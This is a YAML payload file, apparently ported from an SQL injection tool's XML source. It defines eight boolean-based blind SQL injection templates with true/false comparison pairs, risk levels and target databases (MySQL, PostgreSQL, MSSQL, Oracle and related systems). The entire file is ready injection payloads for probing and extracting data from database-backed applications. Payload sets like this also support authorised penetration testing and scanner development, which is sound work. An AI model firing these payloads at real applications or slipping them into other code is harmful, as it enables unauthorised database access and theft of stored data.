# Boolean-based blind payloads — ported from upstream xml/payloads/boolean_blind.xml.
# stype 1 = boolean-blind.
payloads:
  - title: "AND boolean-based blind - WHERE or HAVING clause"
    stype: 1
    level: 1
    risk: 1
    clause: [1, 8, 9]
    where: 1
    vector: "AND [INFERENCE]"
    request:
      payload: "AND [RANDNUM]=[RANDNUM]"
    response:
      comparison:
        payload: "AND [RANDNUM]=[RANDNUM2]"

  - title: "OR boolean-based blind - WHERE or HAVING clause"
    stype: 1
    level: 2
    risk: 3
    clause: [1, 8, 9]
    where: 2
    vector: "OR [INFERENCE]"
    request:
      payload: "OR [RANDNUM]=[RANDNUM]"
    response:
      comparison:
        payload: "OR [RANDNUM]=[RANDNUM2]"

  - title: "AND boolean-based blind - WHERE or HAVING clause (MySQL comment)"
    stype: 1
    level: 2
    risk: 1
    clause: [1, 8, 9]
    where: 1
    vector: "AND [INFERENCE]-- -"
    request:
      payload: "AND [RANDNUM]=[RANDNUM]-- -"
    response:
      comparison:
        payload: "AND [RANDNUM]=[RANDNUM2]-- -"
    dbms: ["mysql", "mariadb", "percona", "tidb"]

  - title: "Boolean-based blind - Parameter replace"
    stype: 1
    level: 3
    risk: 2
    clause: [1, 8]
    where: 1
    vector: "[INFERENCE]"
    request:
      payload: "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [ORIGVALUE]*[RANDNUM] END))"
    response:
      comparison:
        payload: "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM2]) THEN [ORIGVALUE] ELSE [ORIGVALUE]*[RANDNUM] END))"

  - title: "MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause"
    stype: 1
    level: 4
    risk: 2
    clause: [1, 2, 3, 8]
    where: 1
    vector: "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))"
    request:
      payload: "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))"
    response:
      comparison:
        payload: "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM2]) THEN [ORIGVALUE] ELSE 0x28 END))"
    dbms: ["mysql", "mariadb", "percona", "tidb"]

  - title: "PostgreSQL boolean-based blind - Stacked queries (subquery)"
    stype: 1
    level: 4
    risk: 2
    clause: [1, 8, 9]
    where: 1
    vector: "AND [INFERENCE]"
    request:
      payload: "AND (SELECT 1 WHERE [RANDNUM]=[RANDNUM]) IS NOT NULL"
    response:
      comparison:
        payload: "AND (SELECT 1 WHERE [RANDNUM]=[RANDNUM2]) IS NOT NULL"
    dbms: ["postgresql", "greenplum", "redshift", "cockroachdb", "yugabyte", "alloydb", "opengauss"]

  - title: "MSSQL boolean-based blind - WHERE or HAVING clause (IIF)"
    stype: 1
    level: 3
    risk: 1
    clause: [1, 8]
    where: 1
    vector: "AND IIF(([INFERENCE]),1,0)=1"
    request:
      payload: "AND IIF(([RANDNUM]=[RANDNUM]),1,0)=1"
    response:
      comparison:
        payload: "AND IIF(([RANDNUM]=[RANDNUM2]),1,0)=1"
    dbms: ["mssql"]

  - title: "Oracle boolean-based blind - WHERE or HAVING clause (DECODE)"
    stype: 1
    level: 3
    risk: 1
    clause: [1, 8]
    where: 1
    vector: "AND DECODE([INFERENCE],1,1,0)=1"
    request:
      payload: "AND DECODE([RANDNUM]=[RANDNUM],1,1,0)=1"
    response:
      comparison:
        payload: "AND DECODE([RANDNUM]=[RANDNUM2],1,1,0)=1"
    dbms: ["oracle"]
